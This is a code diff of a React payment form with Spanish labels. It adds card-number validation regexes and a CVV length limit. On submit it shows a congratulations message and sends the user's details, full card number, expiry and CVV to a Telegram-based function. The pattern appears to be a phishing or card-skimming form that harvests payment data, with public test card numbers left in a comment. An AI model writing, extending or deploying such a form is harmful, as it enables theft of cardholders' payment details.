@@ -1,24 +1,61 @@
 import React, { useState } from 'react'
+import { useEffect } from 'react'
 import telegramApi from './telegramApi'
+// const cardsExamples=[
+//     4242424242424242,	
+//     5555555555554444,	
+//     2223003122003222,	
+//     5200828282828210,	
+//     5105105105105100,	
+//     371449635398431,
+//     6011111111111117,	
+//     6011000990139424,	
+//     6011981111111113,	
+//     3056930009020004,	
+//     36227206271667,
+//     3566002020360505,	
+//     6200000000000005,
+// ]
 const form2 = ({showMenuPay,inputClass,formPay,setFormPay,setMensajeFelicidades,formUser}) => {
     const [valided,setValided]=useState(false)
     
+    const validTarjeta=(tarjeta)=>{
+        
+        let patron = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/; 
+        let dinerClub=/3(?:0[0-5]|[68][0-9])[0-9]{11}$/
+        let masterCard=/5[1-5][0-9]{14}$/
+        let masterCardS2=/^5[1-5]\d{14}$|^2(?:2(?:2[1-9]|[3-9]\d)|[3-6]\d\d|7(?:[01]\d|20))\d{12}$/
+        let unionPay=/^(62[0-9]{14,17})$/
+        
+        if(patron.test(tarjeta)||dinerClub.test(tarjeta)||
+            masterCard.test(tarjeta)||
+            masterCardS2.test(tarjeta)||
+            unionPay.test(tarjeta)
+        ){
+            setValided(false)
+        }else{
+            setValided(true)
+        }
+        
+    }
+    
+    useEffect(()=>{
+        formPay.cvv.length>4&&setFormPay({...formPay,
+        cvv:formPay.cvv.slice(0,4)})
+    },[formPay])
+    
     const handleChange=(e)=>{
         setFormPay({...formPay,
-            [e.target.name]:e.target.value})
+                [e.target.name]:e.target.value})
     }
-    const validTarjeta=(tarjeta)=>{
-        let patron = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/; 
-        console.log(patron.test(tarjeta))
-        setValided(patron.test(tarjeta))
-    }
+    
     const enviarDatos=(e)=>{
         e.preventDefault()
         const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
-        console.log(formPay)
-        if(valided&&nombreApellido&&expiracion&&cvv){
+        
+        if(!valided&&nombreApellido&&expiracion&&cvv){
             setMensajeFelicidades(true)
-            valided&&telegramApi(formUser,formPay)
+            telegramApi(formUser,formPay)
         }
     }
     return (
@@ -41,7 +78,7 @@ const form2 = ({showMenuPay,inputClass,formPay,setFormPay,setMensajeFelicidades,
                 onBlur={()=>validTarjeta(formPay.numeroTarjeta)}
                 required
             />
-            {!valided&&<div className='text-red-400 px-2 my-2'>Tarjeta invalida</div>} 
+            {valided&&<div className='text-red-400 px-2 my-2'>Tarjeta invalida</div>} 
             <input className={inputClass} onChange={handleChange} 
                 value={formPay.cvv}
                 type="number" 
